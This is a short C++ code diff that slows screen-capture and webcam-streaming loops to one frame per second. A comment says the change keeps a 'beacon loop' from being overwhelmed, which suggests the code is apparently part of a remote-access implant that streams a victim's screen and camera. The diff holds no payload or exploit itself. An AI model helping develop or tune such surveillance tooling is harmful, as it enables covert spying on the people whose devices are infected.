@@ -40,8 +40,8 @@ namespace streaming {
                     chunkId++;
                 }
 
-                // Minimal sleep to avoid 100% CPU, but keep high FPS
-                std::this_thread::sleep_for(std::chrono::milliseconds(50));
+                // Reduce FPS to 1 to avoid overwhelming beacon loop and memory
+                std::this_thread::sleep_for(std::chrono::milliseconds(1000));
             }
 
             callback("screen_stream_end", "SCREEN_STREAM_END");
@@ -92,7 +92,7 @@ namespace streaming {
                     chunkId++;
                 }
 
-                std::this_thread::sleep_for(std::chrono::milliseconds(66)); // ~15 FPS
+                std::this_thread::sleep_for(std::chrono::milliseconds(1000));
             }
 
             callback("webcam_stream_end", "SWEBCAM_STREAM_END");
